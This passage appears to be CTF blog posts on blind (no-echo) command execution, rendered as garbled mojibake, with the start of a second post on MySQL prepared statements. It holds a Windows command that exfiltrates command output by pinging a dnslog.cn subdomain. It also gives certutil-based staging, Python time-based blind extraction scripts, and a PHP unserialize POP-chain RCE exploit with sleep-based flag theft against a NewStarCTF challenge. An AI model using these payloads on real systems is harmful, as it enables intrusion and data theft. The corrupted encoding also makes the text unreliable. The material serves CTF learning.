è¿™ä¸ªå¸¸é‡é€šå¸¸ç”¨äºå­—ç¬¦ä¸²æ“ä½œï¼Œç‰¹åˆ«æ˜¯åœ¨éœ€è¦å¼•ç”¨è‹±æ–‡å¤§å†™å­—æ¯é›†åˆçš„æƒ…å†µä¸‹ã€‚ä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ string.ascii_uppercase æ¥ç”Ÿæˆéšæœºçš„å¤§å†™å­—æ¯ï¼Œæ£€æŸ¥å­—ç¬¦ä¸²ä¸­æ˜¯å¦åŒ…å«å¤§å†™å­—æ¯ç­‰ç­‰ã€‚è¿™ä¸ªå¸¸é‡æä¾›äº†ä¸€ä¸ªæ–¹ä¾¿çš„æ–¹å¼æ¥å¼•ç”¨å¤§å†™å­—æ¯é›†åˆï¼Œè€Œä¸å¿…æ‰‹åŠ¨é”®å…¥æ‰€æœ‰å¤§å†™å­—æ¯ã€‚ ä»¥ä¸Šæ˜¯å‚è€ƒGPTå›ç­”è€Œå»äº†è§£ä»£ç å«ä¹‰ ä¸‹é¢æ˜¯å®ä¾‹å›¾ç‰‡ 5.2 Windows åœ¨Linuxä¸­å¯ä»¥é€šè¿‡pingå¸¦å‡ºå‘½ä»¤ï¼Œä½†æ˜¯Windowsä¸ä¼šæŠŠå‘½ä»¤ç»“æœæ‹¼æ¥åˆ°dnslogä¸Šï¼Œå¯ä»¥ç”¨forå¾ªç¯å¾—åˆ°ç»“æœå†è¿›è¡Œæ‹¼æ¥ for /F %i in ('echo a') do ping -n 1 %i.qzdxj3.dnslog.cn è¿™é‡Œå°±æ˜¯å¤šæä¸€å¥ï¼Œé‡ç‚¹è¿˜æ˜¯åœ¨ä¸å‡ºç½‘çš„æƒ…å†µä¸‹ Windowsä¸­çš„é—®é¢˜å°±æ˜¯å‘½ä»¤ç»“æœä¿å­˜åœ¨å“ªé‡Œï¼Œå¹¶ä¸å¯ä»¥åƒLinuxä¸€æ ·ç›´æ¥æˆªå– è¿™æ¬¡å‡è®¾æ˜¯webç›®å½•ä¸å¯å†™ï¼Œé‚£å°±éœ€è¦æ€è€ƒä¸‹å†™åˆ°åˆ«çš„ç›®å½•è¯¥æ€ä¹ˆè¯»åˆ° å°†å‘½ä»¤å›æ˜¾çš„ç»“æœå†™åˆ°ä¸€ä¸ªå¯å†™çš„ç›®å½•ä¸‹ ä½¿ç”¨certutilå°†å‘½ä»¤ç»“æœbase64ç¼–ç ï¼ŒåŸå› åŒä¸Šå¯ä»¥é¿å…ç‰¹æ®Šå­—ç¬¦ï¼Œæé«˜ç»“æœçš„å‡†ç¡®åº¦ ç”¨findstr /Vå‚æ•°å»é™¤å¤šä½™çš„å­—ç¬¦ï¼Œå°†å»é™¤æ‰å¤šä½™å­—ç¬¦çš„base64ç¼–ç å†æ¬¡å†™å…¥ä¸€ä¸ªæ–‡ä»¶ certutil -encode d:\\\\a d:\\\\b #ç¼–ç å‘½ä»¤ æ–‡ä»¶æ ¼å¼: -----BEGIN CERTIFICATE----- base64 -----END CERTIFICATE----- å»é™¤çš„æ˜¯é¦–è¡Œå°¾è¡Œçš„å¤šä½™å­—ç¬¦ï¼Œ\\Vå‚æ•°æ˜¯åŒ¹é…åˆ°ç›¸åŒçš„å­—ç¬¦ç„¶åå»é™¤ ç”¨forå¾ªç¯å»é™¤æ¢è¡Œç¬¦ å†™å…¥batå¯¹æ¯”å­—ç¬¦ä¸² @echo off (for /f \"delims=\" %%i in ('type \"d:\\c\"') do (set /p =%%i&lt;nul))&gt;\"d:\\d\" ä»¥ä¸‹æ˜¯GPTå¯¹ä¸Šè¿°ä»£ç çš„è§£é‡Šï¼š è¿™æ˜¯ä¸€ä¸ª Windows æ‰¹å¤„ç†è„šæœ¬ï¼Œä¸»è¦ç”¨äºå°†æ–‡ä»¶ \"d:\\c\" çš„å†…å®¹é€è¡Œå†™å…¥æ–‡ä»¶ \"d:\\d\"ï¼Œå¹¶ä¿ç•™æ–‡ä»¶ \"d:\\d\" ä¸­çš„ç©ºè¡Œã€‚ä»¥ä¸‹æ˜¯å¯¹è„šæœ¬çš„é€è¡Œåˆ†æï¼š @echo offï¼šè¿™æ˜¯æ‰¹å¤„ç†è„šæœ¬çš„ä¸€èˆ¬å¼€å¤´ã€‚å®ƒä¼šå…³é—­æ‰¹å¤„ç†çš„å‘½ä»¤å›æ˜¾ï¼Œè¿™æ„å‘³ç€åœ¨è¿è¡Œè„šæœ¬æ—¶ï¼Œä¸ä¼šæ˜¾ç¤ºæ¯ä¸ªå‘½ä»¤çš„æ–‡æœ¬ã€‚è¿™ä½¿å¾—è¾“å‡ºæ›´æ¸…æ™°ï¼Œå› ä¸ºä¸ä¼šæ˜¾ç¤ºå‘½ä»¤æœ¬èº«ï¼Œåªä¼šæ˜¾ç¤ºå‘½ä»¤çš„ç»“æœã€‚ (for /f \"delims=\" %%i in ('type \"d:\\c\"') do (set /p =%%i&lt;nul))ï¼šè¿™æ˜¯è„šæœ¬çš„æ ¸å¿ƒéƒ¨åˆ†ï¼Œå®ƒæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š for /f \"delims=\" %%i in ('type \"d:\\c\"')ï¼šè¿™éƒ¨åˆ†ä½¿ç”¨ for å‘½ä»¤æ¥å¾ªç¯å¤„ç†æ–‡ä»¶ \"d:\\c\" ä¸­çš„å†…å®¹ï¼Œ\"delims=\" éƒ¨åˆ†æŒ‡ç¤ºä¸ä½¿ç”¨åˆ†éš”ç¬¦ï¼Œå› æ­¤æ•´è¡Œæ–‡æœ¬å°†è¢«è¯»å–ã€‚ do (set /p =%%i&lt;nul)ï¼šå¯¹äºæ¯è¡Œä»æ–‡ä»¶ \"d:\\c\" è¯»å–çš„æ–‡æœ¬ï¼Œä½¿ç”¨ set /p å‘½ä»¤å°†è¯¥è¡Œæ–‡æœ¬å†™å…¥æ ‡å‡†è¾“å‡ºï¼ˆå±å¹•ï¼‰å¹¶é€šè¿‡ &lt;nul é‡å®šå‘å°†å…¶æ•è·ã€‚è¿™å®é™…ä¸Šæ˜¯å°†æ¯è¡Œæ–‡æœ¬é€è¡Œå†™å…¥æ ‡å‡†è¾“å‡ºï¼Œä½†æ²¡æœ‰æ˜¾ç¤ºåœ¨å±å¹•ä¸Šã€‚ &gt;\"d:\\d\"ï¼šè¿™éƒ¨åˆ†å°†æ ‡å‡†è¾“å‡ºä¸­çš„å†…å®¹ï¼ˆå³æ–‡ä»¶ \"d:\\c\" ä¸­çš„æ¯ä¸€è¡Œæ–‡æœ¬ï¼‰é‡å®šå‘åˆ°æ–‡ä»¶ \"d:\\d\" ä¸­ï¼Œä»è€Œå°†æ–‡ä»¶ \"d:\\c\" ä¸­çš„å†…å®¹é€è¡Œå†™å…¥æ–‡ä»¶ \"d:\\d\"ã€‚å¦‚æœæ–‡ä»¶ \"d:\\d\" ä¸å­˜åœ¨ï¼Œå°†åˆ›å»ºå®ƒï¼›å¦‚æœå·²ç»å­˜åœ¨ï¼Œå°†è¦†ç›–å…¶å†…å®¹ã€‚ å…ˆå†™å…¥ä¸Šé¢çš„batå»é™¤æ¢è¡Œç¬¦ @echo off #ä¸æ‰“å°è¾“å‡º findstr /b %1 \"d:\\d\" #%1æ˜¯æ¥æ”¶è¾“å…¥ï¼Œ\"a.bat 123\"è¿™æ ·123å°±ä¼šåˆ°%1è¿™ä¸ªä½ç½® #/bæ˜¯ä»å¤´å¼€å§‹åŒ¹é… IF ERRORLEVEL 1 echo a&amp;&amp;goto end #ERRORLEVELæ˜¯ç±»ä¼¼é”™è¯¯å·çš„ä¸œè¥¿ï¼Œå¦‚æœä¸Šé¢è¿™ä¸ªå‘½ä»¤æ‰§è¡ŒæˆåŠŸäº†å°±è¿”å›0ï¼Œåä¹‹1,å¦‚æœåŒ¹é…ä¸åˆ°çš„è¯è¿™é‡Œå°±æ˜¯1ï¼Œç„¶ågotoè·³åˆ°endï¼Œè¿™é‡Œç”¨gotoåŸå› æ˜¯ERRORLEVELä¸ä¼šä¼ åˆ°ä¸‹ä¸ªå‘½ä»¤ï¼Œåœ¨ä¸‹ä¸ªå‘½ä»¤çœ‹æ¥IF ERRORLEVEL 1 echo aè¿™ä¸ªæ˜¯æ‰§è¡ŒæˆåŠŸçš„æ‰€ä»¥è¿”å›0ï¼Œä¹Ÿä¼šè§¦å‘å»¶è¿Ÿï¼Œä¸ºäº†é¿å…æ‰€ä»¥ä½¿ç”¨gotoè·³è¿‡ IF ERRORLEVEL 0 ping 127.0.0.1 #è¿™é‡Œå°±æ˜¯æˆåŠŸåŒ¹é…è¿”å›0è§¦å‘å»¶è¿Ÿ :end ç„¶åå†å†™å…¥batåŒ¹é…å­—ç¬¦ä¸² a.bat æ­£ç¡®å­—ç¬¦----å»¶è¿Ÿ a.bat é”™è¯¯å­—ç¬¦---ä¸å»¶è¿Ÿ åŒæ ·ç”¨pythonå†™ä¸ªè„šæœ¬ import requests import string command = \"echo flag &gt;d:\\\\a\" base64 = \"certutil -encode d:\\\\a d:\\\\b\" base64_clean = \"findstr /V \\\"^---\\\" d:\\\\b &gt; d:\\\\c\" echo_b_bat = \"echo @echo off&gt;&gt;d:\\\\b.bat\" echo_b_bat2 = \"echo (for /f \\\"delims=\\\" %%i in ('type \\\"d:\\\\c\\\"') do (set /p =%%i^&lt;nul))^&gt;\\\"d:\\\\d\\\"&gt;&gt;d:\\\\b.bat\" start = \"d:\\\\b.bat\" echo_a_bat = \"echo @echo off&gt;&gt;d:\\\\a.bat\" echo_a_bat1 = \"echo findstr /b %1 \\\"d:\\\\d\\\"&gt;&gt;d:\\\\a.bat\" echo_a_bat2 = \"echo IF ERRORLEVEL 1 echo a^&amp;^&amp;goto end &gt;&gt;d:\\\\a.bat\" echo_a_bat3 = \"echo IF ERRORLEVEL 0 ping 127.0.0.1&gt;&gt;d:\\\\a.bat\" echo_end = \"echo :end&gt;&gt;d:\\\\a.bat\" cmd = [command, base64, base64_clean,echo_b_bat, echo_b_bat2, start, echo_a_bat,echo_a_bat1,echo_a_bat2,echo_a_bat3,echo_end] url = \"http://127.0.0.1/system.php\" for i in cmd: data = { \"pass\": i } requests.post(url, data=data) print(\"[+]init success\") bp = string.ascii_letters + string.digits + \"+/=\" cmd_base64 = \"\" for i in range(1,65535): for s in bp: data = { \"pass\": \"d:\\\\a.bat \" + cmd_base64 + s } response = requests.post(url, data=data) time = response.elapsed.total_seconds() if time &gt; 3: cmd_base64 += s print(cmd_base64) break ä¸‹é¢æ˜¯å®ä¾‹å›¾ç‰‡ 5.3 æšä¸¾flag æœåŠ¡å™¨æœªè”ç½‘ï¼Œæ— å†™å…¥æƒé™ã€‚æ— æ³•getshellç­‰ä¸€ç³»åˆ—æ“ä½œï¼Œåªèƒ½é€šè¿‡æšä¸¾/äºŒåˆ†æŸ¥æ‰¾æš´åŠ›æŸ¥è¯¢flagã€‚ æ„é€ è„šæœ¬éå†ï¼š # -*-coding:utf-8 -*- import requests import re flag_format = re.compile('flag\\\\{[0-9a-z]{8}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{12}\\\\}') all_letter = '-}0123456789abcdefghijklmnopqrstuvwxyz' def get_flag(command): try: r = requests.get('http://web.train.lilac.com:10008/', params={'command': command}, timeout=1.5) except: return True return False if __name__ == '__main__': flag = 'flag{' while flag_format.match(flag) == None: staus = 0 for i in all_letter: payload = '| cat /flag | grep %s &amp;&amp; sleep 1.8' % (flag + i) print(payload) if get_flag(payload): staus = 1 flag += i print(flag) break if staus == 0: flag = flag[0:-1] 0x06 CTFé¢˜ç›®å®æˆ˜ NewStarCTF 2023 week3 RCE &lt;?php highlight_file(__FILE__); class minipop{ public $code; public $qwejaskdjnlka; public function __toString() { if(!preg_match('/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\{|\\}|\\&gt;|\\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this-&gt;code)){ exec($this-&gt;code); } return \"alright\"; } public function __destruct() { echo $this-&gt;qwejaskdjnlka; } } if(isset($_POST['payload'])){ //wanna try? unserialize($_POST['payload']); } å…ˆæ˜¯ç®€å•çš„ååºåˆ—åŒ–ï¼Œéšåæ˜¯ä¸€ä¸ªæ— å›æ˜¾RCEçš„ç»•è¿‡ï¼Œä¸‹é¢ç®€å•å†™ä¸€ä¸ªpopé“¾ &lt;?php highlight_file(__FILE__); class minipop{ public $code; public $qwejaskdjnlka; } $poc = new minipop(); $poc-&gt;qwejaskdjnlka = new minipop(); $poc-&gt;qwejaskdjnlka-&gt;code = 'RCE'; echo serialize($poc); ?&gt; import time import requests url = \"http://bcdad1a5-6014-4594-a8b5-c4c03f581147.node4.buuoj.cn:81/\" result = \"\" for i in range(1,15): for j in range(1,50): #asciiç è¡¨ for k in range(32,127): k=chr(k) payload =f\"if [ `cat /flag_is_h3eeere | awk NR=={i} | cut -c {j}` == '{k}' ];then sleep 2;fi\" length=len(payload) payload2 ={ \"payload\": 'O:7:\"minipop\":2:{s:4:\"code\";N;s:13:\"qwejaskdjnlka\";O:7:\"minipop\":2:{s:4:\"code\";s:{0}:\"{1}\";s:13:\"qwejaskdjnlka\";N;}}'.format(length,payload) } t1=time.time() r=requests.post(url=url,data=payload2) t2=time.time() if t2-t1 &gt;1.5: result+=k print(result) result += \" \" GPTå¯¹ä¸Šè¿°ä»£ç çš„è§£é‡Š if [ ... ]; then sleep 2; fiï¼šè¿™æ˜¯ä¸€ä¸ªæ¡ä»¶è¯­å¥ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªæ¡ä»¶æµ‹è¯•ã€‚å¦‚æœæ¡ä»¶æµ‹è¯•ä¸ºçœŸï¼ˆtrueï¼‰ï¼Œåˆ™æ‰§è¡Œ sleep 2ï¼Œå³è®©è„šæœ¬ä¼‘çœ 2ç§’ã€‚è¿™æ˜¯ä¸€ç§æ—¶é—´å»¶è¿ŸæŠ€å·§ï¼Œé€šå¸¸ç”¨äºæ—¶é—´ç›²æ³¨æ”»å‡»ï¼Œæ”»å‡»è€…æ ¹æ®æœåŠ¡ç«¯çš„å“åº”æ—¶é—´æ¥æ¨æ–­æ¡ä»¶æ˜¯å¦æˆç«‹ã€‚ ls / | awk NR=={i} | cut -c {j}ï¼šè¿™éƒ¨åˆ†çš„ç›®çš„æ˜¯åˆ—å‡ºæ ¹ç›®å½• / ä¸‹çš„æ–‡ä»¶å’Œç›®å½•ï¼Œå¹¶ä½¿ç”¨ awk å’Œ cut å‘½ä»¤æ¥é€‰æ‹©å…¶ä¸­ä¸€ä¸ªå­—ç¬¦ã€‚è®©æˆ‘è¯¦ç»†è§£é‡Šï¼š ls /ï¼šè¿™éƒ¨åˆ†åˆ—å‡ºäº†æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶å’Œç›®å½•ã€‚ |ï¼šç®¡é“æ“ä½œç¬¦ï¼Œå°† ls å‘½ä»¤çš„è¾“å‡ºä¼ é€’ç»™ä¸‹ä¸€ä¸ªå‘½ä»¤ã€‚ awk NR=={i}ï¼šè¿™æ˜¯ä¸€ä¸ª awk å‘½ä»¤ï¼Œå®ƒæ ¹æ®è¡Œå· NR æ˜¯å¦ç­‰äº {i} æ¥é€‰æ‹©ç‰¹å®šè¡Œã€‚{i} æ˜¯ä¸€ä¸ªå˜é‡ï¼Œå®ƒä»£è¡¨å¤–éƒ¨å¾ªç¯ä¸­çš„ iã€‚ NR æ˜¯ AWK å‘½ä»¤ä¸­çš„ä¸€ä¸ªç‰¹æ®Šå˜é‡ï¼Œè¡¨ç¤ºå½“å‰æ­£åœ¨å¤„ç†çš„è®°å½•ï¼ˆè¡Œï¼‰çš„è¡Œå· |ï¼šå†æ¬¡ä½¿ç”¨ç®¡é“æ“ä½œç¬¦ï¼Œå°† awk å‘½ä»¤çš„è¾“å‡ºä¼ é€’ç»™ä¸‹ä¸€ä¸ªå‘½ä»¤ã€‚ cut -c {j}ï¼šè¿™æ˜¯ cut å‘½ä»¤ï¼Œå®ƒæ ¹æ®å­—ç¬¦ä½ç½® {j} æ¥é€‰æ‹©ç‰¹å®šå­—ç¬¦ã€‚{j} æ˜¯ä¸€ä¸ªå˜é‡ï¼Œå®ƒä»£è¡¨å†…éƒ¨å¾ªç¯ä¸­çš„ jã€‚ == '{k}'ï¼šè¿™éƒ¨åˆ†æ˜¯æ¡ä»¶æµ‹è¯•çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒæ£€æŸ¥å‰é¢å‘½ä»¤çš„è¾“å‡ºå­—ç¬¦æ˜¯å¦ç­‰äºå˜é‡ kï¼Œå…¶ä¸­ k æ˜¯å†…éƒ¨å¾ªç¯ä¸­çš„ ASCII å­—ç¬¦ã€‚ è¿™é‡Œæˆ‘å‘ç°\"payload\": 'O:7:\"minipop\":2:{s:4:\"code\";N;s:13:\"qwejaskdjnlka\";O:7:\"minipop\":2:{s:4:\"code\";s:{0}:\"{1}\";s:13:\"qwejaskdjnlka\";N;}}'.format(length,payload) æ­¤å¤„ä»£ç ä¹‹é—´ç”¨äº†ä¸¤å¯¹èŠ±æ‹¬å· O:7:\"minipop\":2:{s:4:\"code\";N;s:13:\"qwejaskdjnlka\";O:7:\"minipop\":2:s:4:\"code\";s:0:\"\";s:13:\"qwejaskdjnlka\";N;}} è¿™é‡Œæˆ‘å°±ç–‘é—®ä¸ºä½•ä»–ç”¨äº†ä¸¤å¯¹æ‹¬å·ï¼Œäºæ˜¯æˆ‘ç”¨ä¹‹å‰çš„å…ˆè¿è¡Œä¸€ä¸‹å‘ç°å¦‚ä¸‹æŠ¥é”™ å¦‚ä¸Šå›¾å‘ç°æ˜¯keyerroré”™è¯¯ï¼Œæ„æ€æ˜¯å­—å…¸æ ¼å¼çš„é”™è¯¯ï¼Œcsdnæœç´¢äº†ä¸€ä¸‹å‘ç°è¿™ä¸ªè§£é‡Šçš„å¾ˆå¥½ è¿™æ¬¡å†™çš„æ—¶å€™é‡åˆ°äº†å¥‡æ€ªçš„KeyErrorã€‚æˆ‘ä¸€å¼€å§‹æ˜¯è¿™ä¹ˆå†™çš„ï¼š s = r''' function foo() { printf(\"{}\"); } '''.format(arg) ä½†æ˜¯è¿™æ ·ä¼šæŠ¥é”™ã€‚ åæ¥å‘ç°ï¼Œå› ä¸ºformatè‡ªå·±ç”¨å¤§æ‹¬å·ä½œä¸ºå ä½ç¬¦ï¼Œå¦‚æœå­—ç¬¦ä¸²é‡Œæœ¬èº«æœ‰å¤§æ‹¬å·ï¼Œè¿˜å¾—è½¬ä¹‰ä¸€ä¸‹ã€‚å…·ä½“æ€ä¹ˆè½¬ä¹‰ï¼Œå°±æ˜¯ç”¨ä¸¤ä¸ªå¤§æ‹¬å·ï¼Œæ‰€ä»¥åº”è¯¥æ”¹æˆè¿™æ ·ï¼š s = r''' function foo() {{ printf(\"{}\"); }} '''.format(arg) è¿™æ ·æ‰èƒ½æ­£å¸¸è¾“å‡ºã€‚ ä¹‹åå†æœ‰ç±»ä¼¼çš„é¢˜æˆ‘å†æ›´æ–°å§ï¼Œè¿™æ¬¡æ„Ÿè§‰åªæ˜¯ç®€å•äº†è§£äº†ï¼Œä¼¼ä¹è¿˜æ˜¯ä¸ç†Ÿç»ƒå•Šã€‚ 0x07 å‚è€ƒæ–‡ç«  æ— å›æ˜¾æ¡ä»¶ä¸‹çš„å‘½ä»¤æ‰§è¡Œåˆ¤æ–­å’Œåˆ©ç”¨æ–¹å¼ç ”ç©¶ --å®æˆ˜ç±» web-æ— å›æ˜¾çš„å‘½ä»¤æ‰§è¡Œçš„5ç§åå¼¹ä¿¡é“ [CTF]å‘½ä»¤æ‰§è¡Œæ— å›æ˜¾åˆ©ç”¨ CTFå…¥é—¨webç¯‡18å‘½ä»¤æ‰§è¡Œæ— å›æ˜¾çš„åˆ¤æ–­æ–¹æ³•åŠdnslogç›¸å…³ä¾‹é¢˜ æ— å›æ˜¾çš„æ¸—é€æŠ€å·§ RCEç¯‡ä¹‹æ— å›æ˜¾rce Windows/Linuxä¸‹çš„æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ è¶…å…¨çš„å‘½ä»¤ï¼ˆä»£ç ï¼‰æ‰§è¡Œæ¼æ´æ— å›æ˜¾çš„å§¿åŠ¿æ€»ç»“ï¼ˆé™„å¸¦è¯¦ç»†ä»£ç å’Œæµ‹è¯•åˆ†æè¿‡ç¨‹ï¼‰","tags":["åŸºæœ¬çŸ¥è¯†"],"categories":["webçŸ¥è¯†æ€»ç»“"]},{"title":"MySQLé¢„å¤„ç†ç»•è¿‡","path":"/2023/10/27/qian-xi-mysql-yu-chu-li/","content":"0x01 å‰è¨€ å†™æ­¤æ–‡ç« çš„æ¥æºæ˜¯åšCTFé¢˜ç›®æ—¶é‡åˆ°äº†mysqlæ³¨å…¥ï¼Œä¸”é‚£é“é¢˜çš„æ€è·¯æ˜¯æ ¹æ®MySQLæ”¯æŒçš„prepareé¢„å¤„ç†æ¥è¿›è¡Œç»•è¿‡ã€‚ä»¥å‰ä¹Ÿæ²¡äº†è§£è¿‡ï¼Œæ•…åœ¨æ­¤å†™ä¸€ç¯‡æ–‡ç« æ¥è®°å½•ä¸€ä¸‹ã€‚ 0x02 Prepare 2.1 ç®€ä»‹ å¤šæ¬¡æ‰§è¡Œä¸€æ¡ SQL è¯­å¥æ—¶ï¼Œå¦‚æœæ¯æ¬¡éƒ½å¤„ç†è¯¥ SQL è¯­å¥ï¼Œç”Ÿæˆæ‰§è¡Œè®¡åˆ’ï¼Œå¿…ç„¶ä¼šæµªè´¹ä¸€å®šçš„æ—¶é—´ã€‚ SQLé¢„å¤„ç†ï¼ˆPrepareï¼‰ï¼Œæ˜¯ä¸€ç§ç‰¹æ®Šçš„ SQL å¤„ç†æ–¹å¼ï¼›é¢„å¤„ç†ä¸ä¼šç›´æ¥æ‰§è¡Œ SQL è¯­å¥ï¼Œè€Œæ˜¯å…ˆå°† SQL è¯­å¥ç¼–è¯‘ï¼Œç”Ÿæˆæ‰§è¡Œè®¡åˆ’ï¼Œç„¶åé€šè¿‡ Execute å‘½ä»¤æºå¸¦ SQL å‚æ•°æ‰§è¡Œ SQL è¯­å¥ã€‚ Prepare çš„ä½¿ç”¨ååˆ†å¹¿æ³›ï¼Œç»å¤§å¤šæ•° ORM æ¡†æ¶éƒ½æœ‰ API æ”¯æŒï¼› Prepare æ—¢å¯ä»¥æå‡ SQL æ‰§è¡Œæ€§èƒ½ï¼Œè¿˜èƒ½é˜²æ­¢ SQL æ³¨å…¥å¼•å‘çš„å®‰å…¨é—®é¢˜ï¼› Prepare è™½ç„¶åœ¨æ¯ä¸ªæ•°æ®åº“ä¸­çš„è¯­æ³•å·®å¼‚å¾ˆå¤§ï¼Œä½†æ˜¯ä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬éƒ½ä¸ä¼šæ‰‹å†™ SQLï¼Œè€Œæ˜¯ä½¿ç”¨ ORM æ¡†æ¶æ¥åšï¼› 2.1 ç”±æ¥ ä»mysqlæœåŠ¡å™¨æ‰§è¡Œsqlçš„è¿‡ç¨‹æ¥çœ‹ï¼ŒSQLæ‰§è¡Œè¿‡ç¨‹åŒ…æ‹¬ä»¥ä¸‹é˜¶æ®µ è¯æ³•åˆ†æ-&gt;è¯­æ³•åˆ†æ-&gt;è¯­ä¹‰åˆ†æ-&gt;æ‰§è¡Œè®¡åˆ’ä¼˜åŒ–-&gt;æ‰§è¡Œã€‚ è¯æ³•åˆ†æ-&gt;è¯­æ³•åˆ†æè¿™ä¸¤ä¸ªé˜¶æ®µæˆ‘ä»¬ç§°ä¹‹ä¸ºç¡¬è§£æã€‚ è¯æ³•åˆ†æè¯†åˆ«sqlä¸­æ¯ä¸ªè¯ï¼› è¯­æ³•åˆ†æè§£æSQLè¯­å¥æ˜¯å¦ç¬¦åˆsqlè¯­æ³•ï¼Œå¹¶å¾—åˆ°ä¸€æ£µè¯­æ³•æ ‘ï¼ˆLexï¼‰ã€‚ å¯¹äºåªæ˜¯å‚æ•°ä¸åŒï¼Œå…¶ä»–å‡ç›¸åŒçš„sqlï¼Œå®ƒä»¬æ‰§è¡Œæ—¶é—´ä¸åŒä½†ç¡¬è§£æçš„æ—¶é—´æ˜¯ç›¸åŒçš„ã€‚ è€ŒåŒä¸€SQLéšç€æŸ¥è¯¢æ•°æ®çš„å˜åŒ–ï¼Œå¤šæ¬¡æŸ¥è¯¢æ‰§è¡Œæ—¶é—´å¯èƒ½ä¸åŒï¼Œä½†ç¡¬è§£æçš„æ—¶é—´æ˜¯ä¸å˜çš„ã€‚æ‰€ä»¥å¯¹äºsqlæ‰§è¡Œæ—¶é—´è¾ƒçŸ­ï¼Œsqlç¡¬è§£æçš„æ—¶é—´å æ€»æ‰§è¡Œæ—¶é—´çš„æ¯”ç‡è¶Šé«˜ã€‚ Prepareçš„å‡ºç°å°±æ˜¯ä¸ºäº†ä¼˜åŒ–ç¡¬è§£æçš„é—®é¢˜ã€‚ è™½ç„¶Prepareåœ¨executeé˜¶æ®µå¯ä»¥èŠ‚çœç¡¬è§£æçš„æ—¶é—´ã€‚ä½†å¦‚æœsqlåªæ‰§è¡Œä¸€æ¬¡ï¼Œä¸”ä»¥prepareçš„æ–¹å¼æ‰§è¡Œï¼Œé‚£ä¹ˆsqlæ‰§è¡Œéœ€ä¸¤æ¬¡ä¸æœåŠ¡å™¨äº¤äº’ï¼ˆPrepareå’Œexecuteï¼‰, è€Œä»¥æ™®é€šï¼ˆéprepareï¼‰æ–¹å¼ï¼Œåªéœ€è¦ä¸€æ¬¡äº¤äº’ã€‚è¿™æ ·ä½¿ç”¨prepareä¼šå¸¦æ¥é¢å¤–çš„ç½‘ç»œå¼€é”€ï¼Œå¾—ä¸å¿å¤±ã€‚ å¦‚æœåŒä¸€sqléœ€è¦æ‰§è¡Œå¤šæ¬¡ï¼Œæ¯”å¦‚ï¼šä»¥prepareæ–¹å¼æ‰§è¡Œ10æ¬¡ï¼Œé‚£ä¹ˆåªéœ€è¦ä¸€æ¬¡ç¡¬è§£æã€‚è¿™æ—¶å€™é¢å¤–çš„ç½‘ç»œå¼€é”€å°±æ˜¾å¾—å¾®ä¹å…¶å¾®äº†ï¼›å› æ­¤prepareæ›´é€‚ç”¨äºé¢‘ç¹æ‰§è¡Œçš„SQLä¸­ã€‚ 0x03 SQLè¯­å¥çš„æ‰§è¡Œå¤„ç† 3.1 å³æ—¶ SQL ä¸€æ¡ SQL åœ¨ DB æ¥æ”¶åˆ°æœ€ç»ˆæ‰§è¡Œå®Œæ¯•è¿”å›ï¼Œå¤§è‡´çš„è¿‡ç¨‹å¦‚ä¸‹ï¼š 1. è¯æ³•å’Œè¯­ä¹‰è§£æï¼› 2. ä¼˜åŒ– SQL è¯­å¥ï¼Œåˆ¶å®šæ‰§è¡Œè®¡åˆ’ï¼› 3. æ‰§è¡Œå¹¶è¿”å›ç»“æœï¼› å¦‚ä¸Šï¼Œä¸€æ¡ SQL æ˜¯èµ°æµç¨‹å¤„ç†ï¼Œä¸€æ¬¡ç¼–è¯‘ï¼Œå•æ¬¡è¿è¡Œï¼Œæ­¤ç±»æ™®é€šè¯­å¥è¢«ç§°ä½œ Immediate Statements ï¼ˆå³æ—¶ SQLï¼‰ã€‚ 3.2 é¢„å¤„ç† SQL ä½†æ˜¯ï¼Œç»å¤§å¤šæ•°æƒ…å†µä¸‹ï¼ŒæŸéœ€æ±‚å¯èƒ½ä¼šè¦æ±‚æŸä¸€æ¡ SQL è¯­å¥å¯èƒ½ä¼šè¢«åå¤è°ƒç”¨æ‰§è¡Œï¼Œæˆ–è€…æ¯æ¬¡æ‰§è¡Œçš„æ—¶å€™åªæœ‰ä¸ªåˆ«çš„å€¼ä¸åŒï¼ˆæ¯”å¦‚ select çš„ where å­å¥å€¼ä¸åŒï¼Œupdate çš„ set å­å¥å€¼ä¸åŒï¼Œinsert çš„ values å€¼ä¸åŒï¼‰ã€‚å¦‚æœæ¯æ¬¡éƒ½éœ€è¦ç»è¿‡ä¸Šé¢çš„è¯æ³•è¯­ä¹‰è§£æã€è¯­å¥ä¼˜åŒ–ã€åˆ¶å®šæ‰§è¡Œè®¡åˆ’ç­‰ï¼Œåˆ™æ•ˆç‡å°±æ˜æ˜¾ä¸è¡Œäº†ã€‚ æ‰€è°“é¢„ç¼–è¯‘è¯­å¥å°±æ˜¯å°†æ­¤ç±» SQL è¯­å¥ä¸­çš„å€¼ç”¨å ä½ç¬¦æ›¿ä»£ï¼Œå¯ä»¥è§†ä¸ºå°† SQL è¯­å¥æ¨¡æ¿åŒ–æˆ–è€…è¯´å‚æ•°åŒ–ï¼Œä¸€èˆ¬ç§°è¿™ç±»è¯­å¥å«Prepared Statementsã€‚ é¢„ç¼–è¯‘è¯­å¥çš„ä¼˜åŠ¿åœ¨äºå½’çº³ä¸ºï¼šä¸€æ¬¡ç¼–è¯‘ã€å¤šæ¬¡è¿è¡Œï¼Œçœå»äº†è§£æä¼˜åŒ–ç­‰è¿‡ç¨‹ï¼›æ­¤å¤–é¢„ç¼–è¯‘è¯­å¥èƒ½é˜²æ­¢ SQL æ³¨å…¥ã€‚ æ³¨æ„ï¼š è™½ç„¶æ˜¯é€šè¿‡é¢„å¤„ç† SQL çš„æ–¹å¼ä¸€å®šç¨‹åº¦çš„æé«˜äº†æ•ˆç‡ï¼Œä½†æ˜¯å¯¹äºä¼˜åŒ–è€Œè¨€ï¼Œæœ€ä¼˜çš„æ‰§è¡Œè®¡åˆ’ä¸æ˜¯å…‰é  SQL è¯­å¥çš„æ¨¡æ¿åŒ–æ¥å®ç°çš„ï¼Œ 